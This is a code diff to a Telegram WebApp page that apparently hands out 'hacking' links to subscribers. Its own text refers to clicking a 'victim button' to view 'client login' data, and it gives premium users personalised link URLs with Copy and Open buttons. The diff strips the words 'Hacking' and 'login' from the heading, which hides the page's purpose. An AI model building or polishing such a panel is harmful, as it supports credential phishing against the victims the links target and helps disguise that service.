@@ -200,8 +200,8 @@
   <main>
     <!-- Home Section -->
     <section id="home" class="page active" aria-label="Home Section">
-      <h2>Free Hacking Links</h2>
-      <span> Click on victim button to view your all your client login</span>
+      <h2>Free Links</h2>
+      <span> Click on victim button to view your all your client</span>
       <u>
     <a id="openBotBtn" aria-label="Open intelligentverificationlinkbot">
         or Click here
@@ -440,31 +440,72 @@
     freeLinksList.appendChild(li);
   });
 }
-    // Render premium links or message based on user access
-    function renderPremiumLinks() {
-      if (!telegramId) {
-        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Cannot detect your Telegram ID. Please open this WebApp inside Telegram.</p>`;
-        return;
-      }
-      if (typeof premiumUsers === "undefined") {
-        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Premium list is missing. Please check premiumlist.js.</p>`;
-        return;
-      }
-      if (premiumUsers.includes(telegramId)) {
-        // Show premium links
-        let html = '<ul class="link-list" style="max-width: 600px; margin: 0 auto;">';
-        premiumLinks.forEach(link => {
-          const url = formatUrl(link.urlTemplate);
-          html += `
-            <li>
-              <img src="${link.image}" alt="${link.name}">
-              <a href="${url}" target="_blank" rel="noopener noreferrer">${link.name}</a>
-            </li>
-          `;
+// Render premium links or message based on user access
+function renderPremiumLinks() {
+  if (!telegramId) {
+    premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Cannot detect your Telegram ID. Please open this WebApp inside Telegram.</p>`;
+    return;
+  }
+  if (typeof premiumUsers === "undefined") {
+    premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Premium list is missing. Please check premiumlist.js.</p>`;
+    return;
+  }
+  if (premiumUsers.includes(telegramId)) {
+    // Show premium links with Copy + Open buttons
+    premiumContent.innerHTML = "";
+    const ul = document.createElement("ul");
+    ul.className = "link-list";
+
+    premiumLinks.forEach(link => {
+      const li = document.createElement("li");
+
+      const img = document.createElement("img");
+      img.src = link.image;
+      img.alt = link.name;
+
+      const fullUrl = formatUrl(link.urlTemplate);
+
+      // URL text
+      const urlText = document.createElement("div");
+      urlText.textContent = fullUrl;
+      urlText.style.flexGrow = "1";
+      urlText.style.marginRight = "15px";
+      urlText.style.fontFamily = "monospace";
+      urlText.style.fontSize = "0.9rem";
+      urlText.style.userSelect = "text";
+      urlText.style.wordBreak = "break-all";
+
+      // Copy button
+      const copyBtn = document.createElement("button");
+      copyBtn.textContent = "Copy";
+      copyBtn.className = "btn";
+      copyBtn.style.marginRight = "8px";
+      copyBtn.addEventListener("click", () => {
+        navigator.clipboard.writeText(fullUrl).then(() => {
+          copyBtn.textContent = "Copied!";
+          setTimeout(() => (copyBtn.textContent = "Copy"), 1500);
         });
-        html += "</ul>";
-        premiumContent.innerHTML = html;
-      } else {
+      });
+
+      // Open button
+      const openBtn = document.createElement("button");
+      openBtn.textContent = "Open";
+      openBtn.className = "btn";
+      openBtn.addEventListener("click", () => {
+        window.open(fullUrl, "_blank", "noopener");
+      });
+
+      li.appendChild(img);
+      li.appendChild(urlText);
+      li.appendChild(copyBtn);
+      li.appendChild(openBtn);
+
+      ul.appendChild(li);
+    });
+
+    premiumContent.appendChild(ul);
+
+  } else {
 // Show upgrade message
 premiumContent.innerHTML = `
   <div style="max-width:500px;margin:20px auto;padding:16px;border-radius:16px;background:#151933;color:#e9ecff;font-family:system-ui,Roboto,Arial;">
